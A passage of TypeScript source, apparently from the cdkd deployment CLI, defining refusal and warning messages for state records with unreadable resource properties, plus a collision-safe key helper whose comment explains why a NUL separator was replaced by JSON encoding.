 * exactly the state `cdkd deploy` REFUSES
 * ({@link malformedResourcePropertiesRefusalMessage}) and `cdkd diff` previews
 * as a replacement — one command after the evidence was last in cdkd's hands.
 *
 * **The refusal is SCOPED to the records the save would KEEP, and that is what
 * answers the recovery-path objection rather than a flag.**
 * {@link refuseMalformedResourcePropertiesForOrphan} is handed the ids being
 * removed and never names one, so orphaning the DAMAGED record itself — the
 * per-resource way out of exactly this state — still works and actually
 * repairs the record. Compare `malformedDestroyResourcesRefusalMessage`, which
 * has to point at a different COMMAND for its way out because a destroy keeps
 * every record it reads.
 *
 * It must be true under `--dry-run` as well, and it is: the guard sits at the
 * load, far above the `if (options.dryRun)` return. Refusing there is
 * {@link malformedResourcePropertiesRefusalMessage}'s call for the same
 * reason — a plausible rewrite audit table followed by a refusal the moment
 * the flag comes off is the worst arm of all.
 *
 * `stackName` / `region` are the CALLER's resolved identity — the synthesized
 * stack name and the region `pickStackRegion` settled on, never the record's
 * own unvalidated self-report. See {@link stackClause}.
 */
export function malformedOrphanResourcePropertiesRefusalMessage(
  stackName: string | undefined,
  region: string | undefined,
  logicalIds: readonly string[]
): string {
  return (
    `${namedPropertyBagsClause(stackName, region, logicalIds)} 'cdkd orphan' REWRITES and SAVES ` +
    `every record it keeps, so it refuses rather than continuing — under '--dry-run' too, ` +
    `because the rewrite audit table a dry run prints is the wrong one. It is not that the save ` +
    `would fabricate a map: an unreadable bag is carried through VERBATIM. It is that this ` +
    `command exists to leave the record deployable by rewriting every reference to an orphaned ` +
    `resource, and a map it cannot read hides whichever references it holds — a string or a ` +
    `number presents none to find, and a list is walked, so its rewrites are recorded into a ` +
    `container that is still not a map. Continuing would take a lock, report success, and leave ` +
    `a record 'cdkd deploy' then REFUSES. Nothing was written. Repair or remove the record ` +
    `first — or orphan the damaged record ITSELF, which is still allowed: this refusal names ` +
    `only records that would SURVIVE the save, so 'cdkd orphan <its construct path>' removes it ` +
    `and leaves the live AWS resource standing. Inspect the record with: ` +
    `${inspectCommand(stackName, region)}`
  );
}

/**
 * For `cdkd orphan`: refuse a record whose SURVIVING resource entries carry a
 * `properties` bag that cannot be read (issue
 * [#3318](https://github.com/go-to-k/cdkd/issues/3318)).
 *
 * A separate call from {@link refuseMalformedResourceProperties} rather than a
 * flag on it, for the reason {@link refuseMalformedOutputsForDestroy} is
 * separate from {@link refuseMalformedOutputs}: the refusal a user sees must
 * describe what THIS command would have done with the bag, and
 * {@link malformedOrphanResourcePropertiesRefusalMessage} records how far the
 * two consequences diverge.
 *
 * `removedLogicalIds` is the orphan set — the ids this run is dropping from
 * `state.resources`. They are EXCLUDED from the verdict because the save
 * cannot persist a record it is deleting, and because refusing on one would
 * break the recovery path the refusal is otherwise meant to preserve.
 *
 * CALL IT AT THE LOAD, beside {@link refuseMalformedState} and
 * {@link refuseMalformedOutputs}, above `rewriteResourceReferences` — the
 * placement rule {@link repairMalformedResourcesForReadOnly}'s note records.
 * The orphan set is resolved from the synthesized template before the state is
 * loaded, so nothing forces this call any lower.
 */
export function refuseMalformedResourcePropertiesForOrphan(
  state: StackState,
  removedLogicalIds: readonly string[],
  stackName: string | undefined,
  region: string | undefined
): void {
  const removed = new Set(removedLogicalIds);
  const unreadable = unreadableResourcePropertyBags(state).filter((id) => !removed.has(id));
  if (unreadable.length === 0) return;
  // NOT `markNonRetryable`, and for the reason {@link refuseMalformedState}
  // states for the same command: `cdkd orphan` raises this from its own top
  // level — `rewriteResourceReferences` is called from nowhere else — so there
  // is no `withRetry` for the marker to fence. Named in
  // `tests/unit/state/malformed-resources-bag.test.ts`'s UNMARKED table beside
  // its sibling, so a NINTH refusal still cannot join them silently.
  throw new CdkdError(
    malformedOrphanResourcePropertiesRefusalMessage(stackName, region, unreadable),
    STATE_RESOURCES_MALFORMED
  );
}

/**
 * The warning a caller of {@link repairMalformedResourcePropertiesForReadOnly}
 * emits.
 */
export function malformedResourcePropertiesWarning(
  stackName: string | undefined,
  region: string | undefined,
  logicalIds: readonly string[]
): string {
  return (
    `${namedPropertyBagsClause(stackName, region, logicalIds)} Continuing with those maps ` +
    `EMPTY: what these records are stored as holding is NOT what this preview compares against. ` +
    `Where the template still declares the resource, every property it declares previews as an ` +
    `addition and a create-only one as a replacement; where it no longer declares it, the ` +
    `DELETE row shows an empty previous side instead of the stored one. ` +
    `Do NOT run 'cdkd deploy' against this record — it REFUSES on the same defect rather than ` +
    `acting on this preview. See the stored values with: ${inspectCommand(stackName, region)}`
  );
}

/**
 * The key a warned-once-per-record `Set` uses to identify a producer RECORD.
 *
 * ONE spelling, shared by `scrub.ts`'s cross-stack pre-pass and
 * `local-state-loader.ts`'s `Fn::GetStackOutput` reader, because two spellings
 * of one rule is how nine sites stay right and the tenth drifts — the same
 * reason every predicate in this module is here rather than at its call sites.
 *
 * ENCODED, not separated, and issue
 * [#3308](https://github.com/go-to-k/cdkd/issues/3308) is the measurement
 * behind that. Both sites previously joined the two halves with a NUL, which
 * NARROWS the collision without closing it: a stack name is read out of an S3
 * key and is exactly as attacker-controlled as the `outputs` bag, so it can
 * carry a NUL too — `tests/unit/cli/commands/scrub-malformed-and-nameless.test.ts`
 * already plants one. Measured: with a NUL separator, stack `Evil<NUL>us-east-1`
 * in `ap-northeast-1` and stack `Evil` in region `us-east-1<NUL>ap-northeast-1`
 * produce the SAME key, so whichever is warned about second is silently not
 * warned about at all.
 *
 * `JSON.stringify` of a two-element array is injective over string pairs: the
 * quoting escapes anything that could imitate the separator, so no planted name
 * can produce another pair's key.
 *
 * The consequence of a collision is one dropped warning LINE, never a wrong
 * resolution — both records are still read as empty and both reads still miss.
 * That is why this is worth one shared helper rather than a larger mechanism.
 */
export function producerRecordKey(stackName: string, region: string): string {
  return JSON.stringify([stackName, region]);
}
